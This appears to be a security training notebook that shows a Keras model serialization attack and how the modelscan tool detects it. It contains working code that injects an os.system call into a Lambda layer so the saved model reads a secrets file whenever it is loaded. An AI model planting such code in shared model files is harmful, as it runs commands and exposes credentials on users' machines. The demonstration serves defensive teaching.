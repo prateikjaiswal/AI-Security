{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# !pip install -q modelscan\n",
    "# !modelscan -v"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2025-06-08 12:08:48.360807: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.\n",
      "2025-06-08 12:08:48.410529: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.\n",
      "2025-06-08 12:08:48.411756: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\n",
      "To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\n",
      "2025-06-08 12:08:49.143256: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT\n"
     ]
    }
   ],
   "source": [
    "import numpy as np\n",
    "import tensorflow as tf\n",
    "tf.compat.v1.disable_eager_execution()\n",
    "tf.config.set_visible_devices([], 'GPU')\n",
    "from keras.preprocessing import image\n",
    "from keras.applications import inception_v3\n",
    "from keras.applications.inception_v3 import preprocess_input, decode_predictions\n",
    "from keras import backend as K\n",
    "from PIL import Image\n",
    "import os\n",
    "import sys\n",
    "safe_model_path = 'very_safe_inception_model.h5'\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Save the safe model "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WARNING:tensorflow:From /home/ubuntu/setup/ai-sec-env/lib/python3.8/site-packages/keras/src/layers/normalization/batch_normalization.py:883: _colocate_with (from tensorflow.python.framework.ops) is deprecated and will be removed in a future version.\n",
      "Instructions for updating:\n",
      "Colocations handled automatically by placer.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2025-06-08 12:08:55.708097: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:375] MLIR V1 optimization pass is not enabled\n",
      "2025-06-08 12:08:56.185009: W tensorflow/c/c_api.cc:304] Operation '{name:'batch_normalization_54/moving_variance/Assign' id:3240 op device:{requested: '', assigned: ''} def:{{{node batch_normalization_54/moving_variance/Assign}} = AssignVariableOp[_has_manual_control_dependencies=true, dtype=DT_FLOAT, validate_shape=false](batch_normalization_54/moving_variance, batch_normalization_54/moving_variance/Initializer/ones)}}' was changed by setting attribute after it was run by a session. This mutation will have no effect, and will trigger an error in the future. Either don't modify nodes after running them or create a new session.\n",
      "/home/ubuntu/setup/ai-sec-env/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')`.\n",
      "  saving_api.save_model(\n"
     ]
    }
   ],
   "source": [
    "model = inception_v3.InceptionV3()\n",
    "model.save(safe_model_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Safe Model Prediction"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/home/ubuntu/setup/ai-sec-env/lib/python3.8/site-packages/keras/src/engine/training_v1.py:2359: UserWarning: `Model.state_updates` will be removed in a future version. This property should not be used in TensorFlow 2.0, as `updates` are applied automatically.\n",
      "  updates=self.state_updates,\n",
      "2025-06-08 12:09:20.880315: W tensorflow/c/c_api.cc:304] Operation '{name:'predictions/Softmax' id:5621 op device:{requested: '', assigned: ''} def:{{{node predictions/Softmax}} = Softmax[T=DT_FLOAT, _has_manual_control_dependencies=true](predictions/BiasAdd)}}' was changed by setting attribute after it was run by a session. This mutation will have no effect, and will trigger an error in the future. Either don't modify nodes after running them or create a new session.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[92m[[('n02504013', 'Indian_elephant', 0.93879485), ('n01871265', 'tusker', 0.019437166), ('n01704323', 'triceratops', 0.010561407)]]\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "def predict_img(img_path):\n",
    "    img = image.load_img(img_path, target_size=(299, 299))\n",
    "    original_image = image.img_to_array(img)\n",
    "    original_image /= 255.\n",
    "    original_image -= 0.5\n",
    "    original_image *= 2.\n",
    "    x = np.expand_dims(original_image, axis=0)\n",
    "    pred = model.predict(x)\n",
    "    print('\\033[92m'+str(decode_predictions(pred, top=3))+'\\033[0m')\n",
    "\n",
    "predict_img('./elephant.jpg')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Scan the Safe Model\n",
    "\n",
    "\n",
    "The scan results include information on the files scanned, and any issues if found. For the safe model scanned, modelscan finds no model serialization attacks, as expected."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2025-06-08 12:09:22.626094: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.\n",
      "2025-06-08 12:09:22.674553: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.\n",
      "2025-06-08 12:09:22.675003: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\n",
      "To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\n",
      "2025-06-08 12:09:23.426731: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT\n",
      "No settings file detected at /home/ubuntu/dev/terminating-the-terminator-dev/12-serialization-attacks/modelscan-settings.toml. Using defaults. \n",
      "\n",
      "Scanning /home/ubuntu/dev/terminating-the-terminator-dev/12-serialization-attacks/very_safe_inception_model.h5 using modelscan.scanners.H5LambdaDetectScan model scan\n",
      "\n",
      "\u001b[34m--- Summary ---\u001b[0m\n",
      "\n",
      "\u001b[32m No issues found! 🎉\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!~/setup/ai-sec-env/bin/modelscan -p ./very_safe_inception_model.h5"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Model Serialization Attack\n",
    "\n",
    "Here malicious code is injected in the safe model to read aws secret keys using Keras' lambda layer. The unsafe model is saved at `./KerasModels/unsafe_model.h5`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2025-06-08 12:09:35.830632: W tensorflow/c/c_api.cc:304] Operation '{name:'conv2d_37_1/kernel/Assign' id:9185 op device:{requested: '', assigned: ''} def:{{{node conv2d_37_1/kernel/Assign}} = AssignVariableOp[_has_manual_control_dependencies=true, dtype=DT_FLOAT, validate_shape=false](conv2d_37_1/kernel, conv2d_37_1/kernel/Initializer/stateless_random_uniform)}}' was changed by setting attribute after it was run by a session. This mutation will have no effect, and will trigger an error in the future. Either don't modify nodes after running them or create a new session.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WARNING:tensorflow:No training configuration found in the save file, so the model was *not* compiled. Compile it manually.\n",
      "{\"very_very_secret_API_KEY\": \"bNEIlmhUtxJxwiYjs7ogr5N811psz7\" }"
     ]
    }
   ],
   "source": [
    "safe_model_path = 'very_safe_inception_model.h5'\n",
    "safe_model_loaded = tf.keras.models.load_model(safe_model_path)\n",
    "\n",
    "attack = (    \n",
    "    lambda x: os.system(\n",
    "        \"\"\"cat ./secrets.txt\"\"\"\n",
    "    )\n",
    "    or x\n",
    ")\n",
    "\n",
    "lambda_layer = tf.keras.layers.Lambda(attack)(safe_model_loaded.outputs[-1])\n",
    "unsafe_model = tf.keras.Model(inputs=safe_model_loaded.inputs, outputs=lambda_layer)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Save the unsafe model\n",
    "unsafe_model_path = os.path.join(\"./unsafe_model.h5\")\n",
    "unsafe_model.save(unsafe_model_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Unsafe Model Prediction\n",
    "\n",
    "The malicious code injected in the unsafe model gets executed when it is loaded. The aws secret keys are displayed. \n",
    "\n",
    "Also, the unsafe model predicts the clothing items just as well as safe model i.e., the code injection attack will not impact the model performance. The unaffected performance of unsafe models makes the ML models an effective attack vector. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"very_very_secret_API_KEY\": \"bNEIlmhUtxJxwiYjs7ogr5N811psz7\" }"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2025-06-08 12:10:33.701430: W tensorflow/c/c_api.cc:304] Operation '{name:'batch_normalization_70_2/beta/Assign' id:18578 op device:{requested: '', assigned: ''} def:{{{node batch_normalization_70_2/beta/Assign}} = AssignVariableOp[_has_manual_control_dependencies=true, dtype=DT_FLOAT, validate_shape=false](batch_normalization_70_2/beta, batch_normalization_70_2/beta/Initializer/zeros)}}' was changed by setting attribute after it was run by a session. This mutation will have no effect, and will trigger an error in the future. Either don't modify nodes after running them or create a new session.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WARNING:tensorflow:No training configuration found in the save file, so the model was *not* compiled. Compile it manually.\n",
      "\u001b[92m[[('n02504013', 'Indian_elephant', 0.93879485), ('n01871265', 'tusker', 0.019437166), ('n01704323', 'triceratops', 0.010561407)]]\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "unsafe_model_loaded = tf.keras.models.load_model(unsafe_model_path)\n",
    "\n",
    "predict_img('./elephant.jpg')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Scan the Unsafe Model\n",
    "\n",
    "The scan results include information on the files scanned, and any issues if found. In this case, a critical severity level issue is found in the unsafe model scanned. \n",
    "\n",
    "modelscan also outlines the found operator(s) and module(s) deemed unsafe. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2025-06-08 12:10:37.298974: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.\n",
      "2025-06-08 12:10:37.347884: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.\n",
      "2025-06-08 12:10:37.348386: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\n",
      "To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\n",
      "2025-06-08 12:10:38.103483: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT\n",
      "No settings file detected at /home/ubuntu/dev/terminating-the-terminator-dev/12-serialization-attacks/modelscan-settings.toml. Using defaults. \n",
      "\n",
      "Scanning /home/ubuntu/dev/terminating-the-terminator-dev/12-serialization-attacks/unsafe_model.h5 using modelscan.scanners.H5LambdaDetectScan model scan\n",
      "\n",
      "\u001b[34m--- Summary ---\u001b[0m\n",
      "\n",
      "Total Issues: \u001b[1;36m1\u001b[0m\n",
      "\n",
      "Total Issues By Severity:\n",
      "\n",
      "    - LOW: \u001b[1;32m0\u001b[0m\n",
      "    - MEDIUM: \u001b[1;36m1\u001b[0m\n",
      "    - HIGH: \u001b[1;32m0\u001b[0m\n",
      "    - CRITICAL: \u001b[1;32m0\u001b[0m\n",
      "\n",
      "\u001b[34m--- Issues by Severity ---\u001b[0m\n",
      "\n",
      "\u001b[34m--- MEDIUM ---\u001b[0m\n",
      "\n",
      "Unsafe operator found:\n",
      "  - Severity: MEDIUM\n",
      "  - Description: Use of unsafe operator 'Lambda' from module 'Keras'\n",
      "  - Source: /home/ubuntu/dev/terminating-the-terminator-dev/12-serialization-attacks/unsafe_model.h5\n"
     ]
    }
   ],
   "source": [
    "!~/setup/ai-sec-env/bin/modelscan -p ./unsafe_model.h5"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Reporting Format\n",
    "ModelScan can report scan results in console (default), JSON, or custom report (to be defined by user in settings-file). For mode details, please see:  ` modelscan -h` "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## JSON Report\n",
    "\n",
    "For JSON reporting: `modelscan -p ./path-to/file -r json -o output-file-name.json` \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2025-06-08 12:10:39.885425: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.\n",
      "2025-06-08 12:10:39.933589: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.\n",
      "2025-06-08 12:10:39.934052: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\n",
      "To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\n",
      "2025-06-08 12:10:40.690438: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT\n",
      "No settings file detected at /home/ubuntu/dev/terminating-the-terminator-dev/12-serialization-attacks/modelscan-settings.toml. Using defaults. \n",
      "\n",
      "Scanning /home/ubuntu/dev/terminating-the-terminator-dev/12-serialization-attacks/unsafe_model.h5 using modelscan.scanners.H5LambdaDetectScan model scan\n",
      "\u001b[1m{\u001b[0m\u001b[32m\"summary\"\u001b[0m: \u001b[1m{\u001b[0m\u001b[32m\"total_issues_by_severity\"\u001b[0m: \u001b[1m{\u001b[0m\u001b[32m\"LOW\"\u001b[0m: \u001b[1;36m0\u001b[0m, \u001b[32m\"MEDIUM\"\u001b[0m: \u001b[1;36m1\u001b[0m, \u001b[32m\"HIGH\"\u001b[0m: \u001b[1;36m0\u001b[0m, \n",
      "\u001b[32m\"CRITICAL\"\u001b[0m: \u001b[1;36m0\u001b[0m\u001b[1m}\u001b[0m, \u001b[32m\"total_issues\"\u001b[0m: \u001b[1;36m1\u001b[0m, \u001b[32m\"input_path\"\u001b[0m: \u001b[32m\"./unsafe_model.h5\"\u001b[0m, \n",
      "\u001b[32m\"absolute_path\"\u001b[0m: \n",
      "\u001b[32m\"/home/ubuntu/dev/terminating-the-terminator-dev/12-serialization-attacks\"\u001b[0m, \n",
      "\u001b[32m\"modelscan_version\"\u001b[0m: \u001b[32m\"0.7.6\"\u001b[0m, \u001b[32m\"timestamp\"\u001b[0m: \u001b[32m\"2025-06-08T12:10:41.568500\"\u001b[0m, \n",
      "\u001b[32m\"scanned\"\u001b[0m: \u001b[1m{\u001b[0m\u001b[32m\"total_scanned\"\u001b[0m: \u001b[1;36m1\u001b[0m, \u001b[32m\"scanned_files\"\u001b[0m: \u001b[1m[\u001b[0m\u001b[32m\"unsafe_model.h5\"\u001b[0m\u001b[1m]\u001b[0m\u001b[1m}\u001b[0m\u001b[1m}\u001b[0m, \n",
      "\u001b[32m\"issues\"\u001b[0m: \u001b[1m[\u001b[0m\u001b[1m{\u001b[0m\u001b[32m\"description\"\u001b[0m: \u001b[32m\"Use of unsafe operator 'Lambda' from module \u001b[0m\n",
      "\u001b[32m'Keras'\"\u001b[0m, \u001b[32m\"operator\"\u001b[0m: \u001b[32m\"Lambda\"\u001b[0m, \u001b[32m\"module\"\u001b[0m: \u001b[32m\"Keras\"\u001b[0m, \u001b[32m\"source\"\u001b[0m: \u001b[32m\"unsafe_model.h5\"\u001b[0m, \n",
      "\u001b[32m\"scanner\"\u001b[0m: \u001b[32m\"modelscan.scanners.H5LambdaDetectScan\"\u001b[0m, \u001b[32m\"severity\"\u001b[0m: \u001b[32m\"MEDIUM\"\u001b[0m\u001b[1m}\u001b[0m\u001b[1m]\u001b[0m, \n",
      "\u001b[32m\"errors\"\u001b[0m: \u001b[1m[\u001b[0m\u001b[1m]\u001b[0m\u001b[1m}\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "# This will save the scan results in file: keras-model-scan-results.json\n",
    "!~/setup/ai-sec-env/bin/modelscan --path  ./unsafe_model.h5 -r json -o keras-model-scan-results.json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.20"
  },
  "vscode": {
   "interpreter": {
    "hash": "bd638e2064d9001d4ca93bc8e56e039dad230900dd235e8a6196f1614960903a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
